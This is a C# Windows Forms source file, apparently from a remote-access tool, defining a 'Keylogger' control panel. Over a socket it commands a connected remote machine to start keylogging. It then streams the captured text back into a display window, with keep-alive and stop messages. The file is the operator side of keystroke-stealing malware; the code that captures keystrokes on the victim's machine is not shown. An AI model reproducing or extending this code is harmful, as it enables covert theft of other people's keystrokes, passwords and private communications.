using System;
using System.Collections.Generic;
using System.Threading;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;

namespace WindowsFormsApp23
{
    public partial class Keylogger : Form
    {
        public string ip3 { get; set; }
        public Socket clientToSend { get; set; }
        public string newLine { get; set; }
        public string publicIP { get; set; }
        public int closing = 0;
        public Socket client { get; set; }


        public Keylogger()
        {
            InitializeComponent();
            output.ReadOnly = true;
            this.StartPosition = FormStartPosition.CenterScreen;

        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            try
            {
                string tosend = "Keylogger";
                clientToSend.Send(Encoding.ASCII.GetBytes(tosend));
                startKeylogger.Enabled = false;


                backgroundWorker2.RunWorkerAsync();
                backgroundWorker1.RunWorkerAsync();


            } catch
            {
                this.Close();
                MessageBox.Show("No connection.");
            }
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {

            byte[] buffer = new byte[1024]; //לא נמצא בוואיל לופ כדי שזה לא יפגיז לי את הראם

            while (true)
            {
                
                int size = 0;
                size = clientToSend.Receive(buffer);
                if (!(InvokeRequired))
                    output.Text += (Encoding.ASCII.GetString(buffer, 0, size));
                else
                    this.BeginInvoke((MethodInvoker)(() => output.Text += (Encoding.ASCII.GetString(buffer, 0, size))));
                clientToSend.Send(Encoding.ASCII.GetBytes("keep"));


            }

        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            closing = 1;
            clientToSend.Send(Encoding.ASCII.GetBytes("stopplease"));
        }

            private void Keylogger_Load(object sender, EventArgs e)
        {

        }

        private void output_TextChanged(object sender, EventArgs e)
        {

        }

        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            while(closing == 0)
            {
                try
                {
                    if (!InvokeRequired)
                        clientToSend.Send(Encoding.ASCII.GetBytes(" "));
                    else
                        this.BeginInvoke((MethodInvoker)(() => clientToSend.Send(Encoding.ASCII.GetBytes(" "))));

                    Thread.Sleep(100);
                }
                catch
                {
                    break;
                }
            }
            if (!(InvokeRequired))
                this.Close();
            else
                this.BeginInvoke((MethodInvoker)(() => this.Close()));
        }
    }
}
